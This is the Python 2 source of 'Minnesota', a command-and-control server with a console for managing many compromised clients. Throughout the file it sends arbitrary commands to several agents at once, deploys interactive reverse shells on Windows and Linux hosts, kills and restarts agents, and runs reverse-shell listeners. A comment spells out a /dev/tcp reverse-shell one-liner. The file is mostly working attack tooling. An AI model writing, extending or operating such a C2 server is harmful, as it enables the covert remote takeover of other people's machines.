import os
import re
import sys
import git
import socket
import signal
import urllib2
import readline
import requests
import ConfigParser

from time import sleep
from colored import *
from colorama import *
from threading import Thread
from os.path import expanduser

import itertools

import tcp_pty_shell_handler
import tcp_win_shell_handler

#
# TO DO : Executing command on more hosts : exec "command" 0,1
# Simple Handler for reverse shell

CLIENTS_    = []
CLIENTS_IPS = []
__HISTORY__ = []

COMMANDS = ['start server', 'stop server', 'interact', 'list',
            'help', 'exit','status', 'clear', 'history', 'kill',
            'restart', 'info', 'update', 'check updates', 'reboot server',
            'binder','exec']

__VERSION__ = "0.0.3"

STATUS_SERVER = 0 # 0 = Running
SOCKET_INUSE  = ''
LOAD = 0
REBOOT_FLAG = False
repo = 'https://github.com/SPB-Production/Minnesota'


def help():
        help_menu_0 = '''
Usage : python minnesota.py

C&C server for a SCTP network'''

        help_menu_2 = '''
Minnesota CLI Commands:
    binder                              Start a listener to connect to other reverse shells
    check updates                       Check for new versions of Minnesota
    clear                               Clear the console
    exec 0,1,... <|commandtoexecute|>   Execute a command on more clients
    exit                                Exit the server and keep all connections alive
    help                                Print this menu
    history                             Print all command executed
    info                                Get software info
    interact                            Deploy a shell on the selected client
    kill  0,1,...                       Kill all client by index number
    list                                Print a list of all clients connected
    reboot server                       Restart the server
    restart 0,1,...                     Restart all client by index number
    start server                        Start the server and listen for connections
    status                              Print the current server status
    stop server                         Stop the server without killing all connections
    update                              Update Minnesota to newest version'''
        help_menu_3 = '''
Shell Bash Commands:
    *                                   All shell commands of the running OS are currently supported
    exit                                Destroy the shell
    kill                                Kill the client connection
        
        '''
        print (fore.PALE_GREEN_3B + help_menu_0 + style.RESET)
        print (fore.DARK_SEA_GREEN_3A + help_menu_2 + style.RESET)
        print (fore.DARK_SLATE_GRAY_3 + help_menu_3 + style.RESET)

def spin():
  global LOAD
  spinner = itertools.cycle(['-', '/', '|', '\\'])
  LOAD = 0
  while (LOAD<1):
    sys.stdout.write(spinner.next())  # write the next character
    sys.stdout.flush()                # flush stdout buffer (actual character display)
    sys.stdout.write('\b')            # erase the last written char
    sleep(0.1)

def banner():
        global LOAD
        # Setting up a nice console for the handler
        # Cleaning up the console by Os
        os.system("clear")

        # Printing a welcome message 
        line1 = ''' __  __ _                             _        
|  \/  (_)_ __  _ __   ___  ___  ___ | |_ __ _ '''
        line2 = '''| |\/| | | '_ \| '_ \ / _ \/ __|/ _ \| __/ _` |'''
        line3 = '''| |  | | | | | | | | |  __/\__ \ (_) | || (_| |''' 
        line4 = '''|_|  |_|_|_| |_|_| |_|\___||___/\___/ \__\__,_|
                                                '''
        

        lines = ["%s" % line1]
            
        for line in lines:           
            for c in line:           
                sys.stdout.write(fore.DARK_OLIVE_GREEN_3 + style.BOLD + c + style.RESET)
                sys.stdout.flush() 
                sleep(0.001) 
        sys.stdout.write("\n")

        lines = ["%s" % line2]
            
        for line in lines:           
            for c in line:           
                sys.stdout.write(fore.DARK_SEA_GREEN_3B + style.BOLD + c + style.RESET)
                sys.stdout.flush() 
                sleep(0.001) 
        sys.stdout.write("\n")
        lines = ["%s" % line3]
            
        for line in lines:           
            for c in line:           
                sys.stdout.write(fore.DARK_SEA_GREEN_2 + style.BOLD + c + style.RESET)
                sys.stdout.flush() 
                sleep(0.001)
        sys.stdout.write("\n")
        lines = ["%s" % line4]
            
        for line in lines:           
            for c in line:           
                sys.stdout.write(fore.LIGHT_CYAN_3 + style.BOLD + c + style.RESET)
                sys.stdout.flush() 
                sleep(0.001)

        sys.stdout.write("\n")


        thread6 = Thread(target = spin)
        thread6.start()
        os.system('setterm -cursor off')
        welcome_str = "| V%s\n" % __VERSION__   
        data = ["c","&","c"," ","s","e","r","v","e","r"," ","f","o","r"," ", "t","c","p"," ","n","e","t","w","o","r","k"," "]
        # display with one upper char
        ittool = ['-', '/', '|', '\\']
        for x in range(len(data)):
            # remeber lower char
            if data[x] in ittool:
              continue
            
            old = data[x]

            # replace with upper char
            data[x] = old.upper()

            # create full text
            text = "".join(data)

            # display full text
            sys.stdout.write("\r")
            sys.stdout.write(text)
            sys.stdout.flush()

            # put back lower char
            data[x] = old

            sleep(0.07)

        # display without upper chars at the end 

        text = "".join(data)

        sys.stdout.write("\r")
        sys.stdout.write(text.upper() + welcome_str)
        sys.stdout.flush()
        LOAD += 1
        sys.stdout.write("\n")
        os.system('setterm -cursor on')

def always_listen():
  global HOST, PORT, STATUS_SERVER
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(MAX_CONN)
    s.settimeout(0.2)
  except Exception,e:
    print (fore.LIGHT_RED + "[!] " + style.RESET + "Error : %s.\n" % e)
    os._exit(0)
  while (STATUS_SERVER < 1):
    try:
      conn, addr = s.accept()
      CLIENTS_.append(conn)
      CLIENTS_IPS.append(addr)
    except:
      pass
  



def ping():
  global CLIENTS_, CLIENTS_IPS, STATUS_SERVER
  while (STATUS_SERVER < 1):
    if not CLIENTS_:
      pass
    else:
      for client in CLIENTS_:
        if client == SOCKET_INUSE:
          pass
        else:
          try:
            client.send('hello')
          except:
            CLIENTS_IPS.pop(int(CLIENTS_.index(client)))
            CLIENTS_.remove(client)
    sleep(2)

def complete(text, state):
    for cmd in COMMANDS:
        if cmd.startswith(text):
            if not state:
                return cmd
            else:
                state -= 1

def find_between(st,first,last):
    try:
        start = st.index(first)+len(first)
        end = st.index(last,start)
        return st[start:end]
    except ValueError:
        return ""


def downloadandupdate():
  global repo
  print (fore.DODGER_BLUE_2 + style.BOLD + "[*] " + style.RESET + "Downloading Minnesota repo ...")
  try:
    home = expanduser("~")
    print (fore.DODGER_BLUE_2 + style.BOLD + "[*] " + style.RESET + "Flushing destination folder ...")
    os.system("sudo rm -f -r %s/Minnesota/" % home)
    git.Git(home).clone(repo)
    print (fore.GREEN_1 + "[+] " + style.RESET + "Downloaded." )
    print (fore.DODGER_BLUE_2 + style.BOLD + "[*] " + style.RESET + "Installing Minnesota ...")
    os.chdir(home + "/Minnesota/")
    os.system("sudo python setup.py build > /dev/null/")
    os.system("sudo python setup.py install > /dev/null/")
    print (fore.GREEN_1 + "[+] " + style.RESET + "Installed , please restart Minnesota to launch updated version.\n" )
  except Exception,e:
        print (fore.LIGHT_RED + "[!] " + style.RESET + "Error : %s.\n" % e )


def parser(command):
  global HOST, PORT, STATUS_SERVER, CLIENTS_, CLIENTS_IPS, RPORT, RPORT1, REBOOT_FLAG, LOAD,repo

  if command == "help":
    help()
  elif command == "exit":
    sys.stdout.write (fore.LIGHT_RED + "\n[!] " + style.RESET + "Shutting down server ... Press CTRL + C to force quit ")
    thread6 = Thread(target = spin)
    thread6.start()
    STATUS_SERVER += 1
    sleep(1)
    sys.stdout.write(fore.LIGHT_RED + "\r[!] " + style.RESET + "Shutted down successfully . Bye .                      \n")
    LOAD += 1
    os._exit(0)
  elif command == "info":
    print (fore.GREEN_1 + "\nName\t\t" + style.RESET + " : " + "Minnesota")
    print (fore.GREEN_1 + "Attual version\t" + style.RESET + " : " + str(__VERSION__))
    print (fore.GREEN_1 + "Repo\t\t" + style.RESET + " : " + repo)
    print (fore.GREEN_1 + "Author\t\t" + style.RESET + " : " + "Spaceb4r - Spacetech\n")


  elif command == "check updates":
    print (fore.DODGER_BLUE_2 + style.BOLD + "[*] " + style.RESET + "Checking for Minnesota update ... ")
    thread6 = Thread(target = spin)
    thread6.start()
    try:
      s = '<span class="pl-v">version</span>'
      r = requests.get(repo)
      result = r.text
      for line in result.splitlines():
        if "Minnesota V." in line:
            onlineversion = str(find_between(str(line), "Minnesota V.", "</h1>"))
            if __VERSION__ == onlineversion:
              print (fore.GREEN_1 + "[+] " + style.RESET + "Minnesota is updated." )
            else:
              print (fore.LIGHT_RED  + "[!] " + style.RESET + "A new version of Minnesota is released : " + fore.GREEN_1 + style.BOLD + onlineversion + style.RESET + " ,attual version : " + fore.LIGHT_RED  + __VERSION__ + style.RESET)
              print (fore.DODGER_BLUE_2 + style.BOLD + "[*] " + style.RESET + "To update Minnesota enter : " + style.BOLD + "update\n" + style.RESET )
    except Exception,e:
        print (fore.LIGHT_RED + "[!] " + style.RESET + "Error : %s." % e )
    LOAD += 1
    
  elif command == "binder":
    IPTOBIND = raw_input(fore.DODGER_BLUE_2 + style.BOLD + "[*] "+ style.RESET + "Enter the Ip to listen to [0.0.0.0] : ")
    if IPTOBIND == "" or IPTOBIND == " ":
      IPTOBIND = "0.0.0.0"
    
    PORTTOBIND = raw_input(fore.DODGER_BLUE_2 + style.BOLD + "[*] "+ style.RESET + "Enter the Ip to listen to [31337] : ")
    if PORTTOBIND == "" or PORTTOBIND == " ":
      PORTTOBIND = 31337

    OSSELECTED = raw_input(fore.DODGER_BLUE_2 + style.BOLD + "[*] "+ style.RESET + "Starting reverse TCP handler for what Os [Win] : ")
    if OSSELECTED == "" or OSSELECTED == " ":
      OSSELECTED = "Win"


    # bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 # Linux
    # cmd.exe -i >& /dev/tcp/10.0.0.1/8080 0>&1 # Windows

    if OSSELECTED == "Win" or OSSELECTED == "Windows" or OSSELECTED == "win" or OSSELECTED == "windows": # Windows
        print (fore.DODGER_BLUE_2 + style.BOLD + "\n[*] "+ style.RESET + "Setting up reverse TCP handler for Windows ...")
        print (fore.DODGER_BLUE_2 + style.BOLD + "[*] "+ style.RESET + "Started reverse handler on %s:%s" % (IPTOBIND,str(PORTTOBIND)))
      
        tcp_win_shell_handler.run(IPTOBIND,PORTTOBIND) # Windows
        
    else:
        print (fore.DODGER_BLUE_2 + style.BOLD + "\n[*] "+ style.RESET + "Setting up reverse TCP handler for Linux ...")
        print (fore.DODGER_BLUE_2 + style.BOLD + "[*] "+ style.RESET + "Started reverse handler on %s:%s" % (IPTOBIND,str(PORTTOBIND)))
      
        tcp_pty_shell_handler.run(IPTOBIND,PORTTOBIND) # Linux

    print (fore.DODGER_BLUE_2 + style.BOLD + "\n[*] "+ style.RESET + "Minnesota binder - Session closed .\n" )


  elif command == "update":
    try:
      s = '<span class="pl-v">version</span>'
      r = requests.get(repo)
      result = r.text
      for line in result.splitlines():
        if "Minnesota V." in line:
            onlineversion = str(find_between(str(line), "Minnesota V.", "</h1>"))
            if __VERSION__ == onlineversion:
              sys.stdout.write (fore.YELLOW_3A + "\n[!] " + style.RESET + "Minnesota is already updated, do you want to proceed anyway [y/N] : " )
              choose = raw_input("")
              if choose == "y" or choose == "Y" or choose == "yes" or choose == "Yes" or choose == "YES":
                downloadandupdate()
              else:
                print (fore.LIGHT_RED + "[!] " + style.RESET + "User aborted ." )
                continue
            else:
              print (fore.DODGER_BLUE_2 + style.BOLD + "[*] " + style.RESET + "Updating Minnesota to " + style.BOLD + fore.GREEN_1 + onlineversion  + style.RESET + " ... " )
              thread6 = Thread(target = spin)
              thread6.start()
              downloadandupdate()
    except Exception,e:
        print (fore.LIGHT_RED + "[!] " + style.RESET + "Error : %s." % e )
    LOAD += 1

  elif command.startswith("exec "):
    try:
      index = command.split(" ")[1]
      commandtosend = str(find_between(str(command), "<|", "|>"))  # exec 0,1 <|whoami|>
      if len(commandtosend) < 1 :
        print (fore.LIGHT_RED + "[!] " + style.RESET + "Error : Command must has a lenght major of 1." + style.RESET)
        pass
      else:
        if index == "*":
          for element in CLIENTS_:
              try: 
                buffer1 = CLIENTS_.index(element)
                buffer = CLIENTS_IPS[int(buffer1)]
                buffer = find_between(str(buffer), "'", "'")
                sys.stdout.write (fore.DODGER_BLUE_2 + style.BOLD + "[*] " + style.RESET + "Forwading command to : %s ... " % buffer)  
                sys.stdout.flush()
                thread6 = Thread(target = spin)
                thread6.start()
                attual_socket = CLIENTS_[buffer1]
                attual_socket.send("exec " + commandtosend)
                sleep(2)
                sys.stdout.write(fore.GREEN_1 + "\r[+] " + style.RESET + "Executed on : %s.                           \n" % buffer)
              except Exception,e:
                  print (fore.LIGHT_RED + "[!] " + style.RESET + "Error : %s." % e + style.RESET)
              LOAD += 1
        else:
          index = index.split(",")
          for element in index:
            try:
              buffer = CLIENTS_IPS[int(element)]
              buffer = find_between(str(buffer), "'", "'")
              sys.stdout.write (fore.DODGER_BLUE_2 + style.BOLD + "[*] " + style.RESET + "Forwading command to : %s ... " % buffer)  
              sys.stdout.flush()
              thread6 = Thread(target = spin)
              thread6.start()
              attual_socket = CLIENTS_[int(element)]
              attual_socket.send("exec " + commandtosend)
              sleep(2)
              sys.stdout.write(fore.GREEN_1 + "\r[+] " + style.RESET + "Executed on : %s.                             \n" % buffer)
            except Exception,e:
                print (fore.LIGHT_RED + "[!] " + style.RESET + "Error : %s." % e + style.RESET)
        print ""
        LOAD += 1
    except Exception,e:
        print (fore.LIGHT_RED + "[!] " + style.RESET + "Error : %s.\n" % e )  

  elif command == "list":
    try:
        # Print grid
        if not CLIENTS_IPS:
            print (fore.LIGHT_RED  + "[!] " + style.RESET + "No connections stored yet.\n" )
        else:
          sys.stdout.write(fore.LIGHT_CYAN_3 + "\n" + style.UNDERLINED + "Index" + style.RESET + "\t" + style.RESET )
          sys.stdout.write(fore.LIGHT_CYAN_3 + "\t" + style.UNDERLINED + "Ip Address" + style.RESET + "\n")
          for client in CLIENTS_IPS:
              sys.stdout.write(fore.WHITE + "\n%s" % CLIENTS_IPS.index(client) + style.RESET + ")\t")
              buffer = CLIENTS_IPS[int(CLIENTS_IPS.index(client))]
              buffer = find_between(str(buffer), "'", "'")
              sys.stdout.write(fore.WHITE + "\t%s" % buffer + style.RESET )
              
          sys.stdout.write("\n\n")
    except Exception,e:
        print (fore.LIGHT_RED + "[!] " + style.RESET + "Error : %s.\n" % e )

  elif command == "start server":
    if STATUS_SERVER == 0:
      print (fore.GREEN_1 + "[*] " + style.RESET + "Server already online on " + HOST + ":" + str(PORT) + "\n") 
    else:
      try:
        print (fore.DODGER_BLUE_2 + style.BOLD + "[*] " + style.RESET + "Starting server ...")
        thread6 = Thread(target = spin)
        thread6.start()
        STATUS_SERVER = 0
        thread = Thread(target = always_listen)
        thread.start()
        sleep(1)
        print (fore.GREEN_1 + "[+] " + style.RESET + "Ok.\n" )
      except Exception,e:
          print (fore.LIGHT_RED + "[!] " + style.RESET + "Error : %s.\n" % e )
    LOAD += 1

  elif command == "stop server":
    if STATUS_SERVER == 1:
      print (fore.LIGHT_RED + "[!] " + style.RESET + "Server already offline.\n")
    else:
      try:
        print (fore.DODGER_BLUE_2 + style.BOLD + "[*] " + style.RESET + "Stopping server ..." )
        thread6 = Thread(target = spin)
        thread6.start()
        STATUS_SERVER += 1
        CLIENTS_ = []
        CLIENTS_IPS = []
        sleep(1)
        print (fore.GREEN_1 + "[+] " + style.RESET + "Ok.\n" )
      except Exception,e:
          print (fore.LIGHT_RED + "[!] " + style.RESET + "Error : %s.\n" % e )
    LOAD += 1

  elif command == "status":
    if STATUS_SERVER == 1 :
        print (fore.LIGHT_RED + "[!] " + style.RESET + " Offline.\n")
    elif STATUS_SERVER == 0:
        print (fore.GREEN_1 + "[+] " + style.RESET + "Online on " + HOST + ":" + str(PORT) + "\n") 

  elif command == "reboot server":
    REBOOT_FLAG = True
    if STATUS_SERVER == 1:
      print (fore.LIGHT_RED + "[!] " + style.RESET + "Can't reboot server offline.\n")
    else:
      print (fore.DODGER_BLUE_2 + style.BOLD + "[*] " + style.RESET + "Rebooting server ..." )
      thread6 = Thread(target = spin)
      thread6.start()
      STATUS_SERVER += 1
      CLIENTS_ = []
      CLIENTS_IPS = []
      sleep(1)
      STATUS_SERVER = 0
      thread = Thread(target = always_listen)
      thread.start()
      print (fore.GREEN_1 + "[+] " + style.RESET + "Ok.\n") 
    LOAD += 1

  elif command == "history":
      print ""
      for cmd in __HISTORY__:
        print (fore.DARK_ORANGE_3A + style.BLINK + style.BOLD +  cmd + style.RESET)

  elif command.startswith("restart"):
    index = command.split(" ")[1]
    if index == "*":
      for sock in CLIENTS_:
        buffer    = CLIENTS_.index(sock) 
        remote_ip = CLIENTS_IPS[int(buffer)]
        try:
          attual_socket = sock
          attual_socket.send("restart")
          CLIENTS_.pop(int(buffer))
          CLIENTS_IPS.pop(int(buffer))
          print (fore.DODGER_BLUE_2 + style.BOLD + "[*] " + style.RESET + "Restarted agent on : %s." % str(find_between(str(remote_ip), "'", "'"))  )
        except Exception,e:
            print (fore.LIGHT_RED + "[!] " + style.RESET + "Error : %s.\n" % e + style.RESET)
    else:
      index = index.split(",")
      for element in index:
        remote_ip = CLIENTS_IPS[int(element)]
        try:
          attual_socket = CLIENTS_[int(element)]
          attual_socket.send("restart")
          CLIENTS_.pop(int(element))
          CLIENTS_IPS.pop(int(element))
          print (fore.DODGER_BLUE_2 + style.BOLD + "[*] " + style.RESET + "Restarted agent on : %s." % str(find_between(str(remote_ip), "'", "'"))  )
        except Exception,e:
            print (fore.LIGHT_RED + "[!] " + style.RESET + "Error : %s.\n" % e + style.RESET)
    print "\n"
    

  elif command.startswith("interact "):
    try:
      index = command.split(" ")[1]
      attual_socket = CLIENTS_[int(index)]
      remote_ip     = CLIENTS_IPS[int(index)]
      print (fore.DODGER_BLUE_2 + style.BOLD + "\n[*] "+ style.RESET + "Started reverse handler on %s:%s" % (str(find_between(str(remote_ip), "'", "'")),str(RPORT))  )
      SOCKET_INUSE  = attual_socket
      attual_socket.send("shell")
      
      
      s_tmp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s_tmp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
      s_tmp.settimeout(5)
      s_tmp.bind((HOST, 7888)) 
      s_tmp.listen(1)

      print (fore.DODGER_BLUE_2 + style.BOLD + "[*] "+ style.RESET + "Sending stage (5 bytes) to %s " % str(find_between(str(remote_ip), "'", "'")))

      tmp_conn, tmp_addr = s_tmp.accept()
      shelltodeploy = tmp_conn.recv(1024)

      if shelltodeploy == "nt": # Windows
        print (fore.DODGER_BLUE_2 + style.BOLD + "[*] "+ style.RESET + "Recognized Os : Windows")
        try:
          tmp_conn.send("nt")
        except Exception,e:
          print (fore.LIGHT_RED + "[!] " + style.RESET + "Error : %s.\n" % e + style.RESET)
          pass
        print (fore.GREEN_1 + style.BLINK +  "[+] "+ style.RESET + "Minnesota Windows shell deployed successfully (%s:%s -> %s:%s)" % (str(find_between(str(remote_ip), "'", "'")),str(RPORT1),HOST,str(RPORT1) )  )
        print (fore.GREEN_1 + style.BLINK +  "[*] "+ style.RESET + "Press < ENTER > to access .")        
        tcp_win_shell_handler.run(HOST,RPORT1) # 31338 -> Windows
        
      else:
        print (fore.DODGER_BLUE_2 + style.BOLD + "[*] "+ style.RESET + "Recognized Os : Linux")
        try:
          tmp_conn.send("posix")
        except Exception,e:
          print (fore.LIGHT_RED + "[!] " + style.RESET + "Error : %s.\n" % e + style.RESET)
          pass
        tcp_pty_shell_handler.run(HOST,RPORT) # 31337 -> Linux
  
      print (fore.DODGER_BLUE_2 + style.BOLD + "\n[*] "+ style.RESET + "Killing Minnesota shell ...")
      sleep(1)
      print (fore.DODGER_BLUE_2 + style.BOLD + "[*] "+ style.RESET + "%s:%s - Minnesota shell destroyed.\n" % (str(find_between(str(remote_ip), "'", "'")),str(RPORT))   )
      try:
        CLIENTS_.remove(attual_socket)
        CLIENTS_IPS.remove(remote_ip)
      except:
        pass
    except Exception,e:
        if "Errno 32" in e:
          try:
            CLIENTS_.remove(attual_socket)
            CLIENTS_IPS.remove(remote_ip)
          except:
            pass
        print (fore.LIGHT_RED + "[!] " + style.RESET + "Error : %s.\n" % e + style.RESET)
  
  elif command == "clear":
    banner()
  elif command.startswith("kill "):
    index = command.split(" ")[1]
    if index == "*":
      sys.stdout.write (fore.LIGHT_RED + "[!] " + style.RESET + "Are you sure to kill all connections ? [N/y] :" + style.RESET)
      choose = raw_input("")
      if choose == "" or choose == " " or choose == "N" or choose == "n" or choose == "No" or choose == "NO" or choose == "nO":
        print (fore.DODGER_BLUE_2 + style.BOLD + "[*] " + style.RESET + "Global killing aborted.")
        pass
      elif choose == "y" or choose == "Y" or choose == "yes" or choose == "Yes" or choose == "YES":
        for element in CLIENTS_:
          try: 
            buffer1 = CLIENTS_.index(element)
            buffer = CLIENTS_IPS[int(buffer1)]
            buffer2= CLIENTS_IPS[int(buffer1)]
            buffer = find_between(str(buffer), "'", "'")
            sys.stdout.write (fore.DODGER_BLUE_2 + style.BOLD + "[*] " + style.RESET + "Killing : %s - %s ..." % (str(buffer1),buffer)  )
            sys.stdout.flush()
            thread6 = Thread(target = spin)
            thread6.start()
            attual_socket = CLIENTS_[buffer1]
            attual_socket.send("kill")
            sleep(1)
            CLIENTS_.remove(attual_socket)
            CLIENTS_IPS.remove(buffer2)
            sys.stdout.write(fore.GREEN_1 + "\r[+] " + style.RESET + "Killed : %s - %s .    \n" % (str(buffer1),buffer))
          except Exception,e:
              print (fore.LIGHT_RED + "[!] " + style.RESET + "Error : %s.\n" % e + style.RESET)
          LOAD += 1
      else:
        print (fore.DODGER_BLUE_2 + style.BOLD + "[*] " + style.RESET + "Global killing aborted.\n")
        pass
    else:
      index = index.split(",")
      for element in index:
        try:
          buffer = CLIENTS_IPS[int(element)]
          buffer2 = CLIENTS_IPS[int(element)]
          buffer = find_between(str(buffer), "'", "'")
          sys.stdout.write (fore.DODGER_BLUE_2 + style.BOLD + "[*] " + style.RESET + "Killing : %s - %s ..." % (str(element),buffer)  )
          sys.stdout.flush()
          thread6 = Thread(target = spin)
          thread6.start()
          attual_socket = CLIENTS_[int(element)]
          attual_socket.send("kill")
          sleep(1)
          CLIENTS_.remove(attual_socket)
          CLIENTS_IPS.remove(buffer2)
          sys.stdout.write(fore.GREEN_1 + "\r[+] " + style.RESET + "Killed : %s - %s .    \n" % (str(element),buffer))
        except Exception,e:
            print (fore.LIGHT_RED + "[!] " + style.RESET + "Error : %s." % e + style.RESET)
    print ""
    LOAD += 1
  elif command == "" or command == " ":
    pass
  else:
    print (fore.LIGHT_RED + "[!] " + style.RESET + "Error : Command unrecognized.\n")
def command_line():
  
    while True:
      # Signal var handler        
      readline.parse_and_bind("tab: complete")
      readline.set_completer(complete)

      
      sys.stdout.write(style.UNDERLINED + "mnstconsole(%s) $:" % str(len(CLIENTS_IPS)) + style.RESET)
 
      internal_command = raw_input (" ")

      if "history" in internal_command or internal_command == "" or internal_command == " ":
        pass
      else:
        __HISTORY__.append(internal_command)
      parser(internal_command)
  
def run():
  global HOST, PORT , RPORT, RPORT1, MAX_CONN
  
  banner()

  config = ConfigParser.RawConfigParser()   
  this_dir, this_filename = os.path.split(__file__)
  DATA_PATH = os.path.join(this_dir, "conf", "server.conf")

  config.read(DATA_PATH)

  HOST = config.get('config', 'HOST')
  PORT = int(config.get('config', 'PORT'))
  RPORT = int(config.get('config', 'RPORT_LIN'))
  RPORT1 = int(config.get('config', 'RPORT_WIN'))
  MAX_CONN = int(config.get('config', 'MAX_CONN'))


  thread = Thread(target = always_listen)
  thread.start()
  
  try:
    thread1 = Thread(target = command_line)
    thread1.start()
    while thread1.isAlive(): 
      thread1.join(1)  # not sure if there is an appreciable cost to this.
  except (KeyboardInterrupt, SystemExit):
    print (fore.LIGHT_RED + "\n\n[!] " + style.RESET + "Forcing shutting down ... \n" + style.RESET)
    os._exit(0)

  thread2 = Thread(target = ping)
  thread2.start()



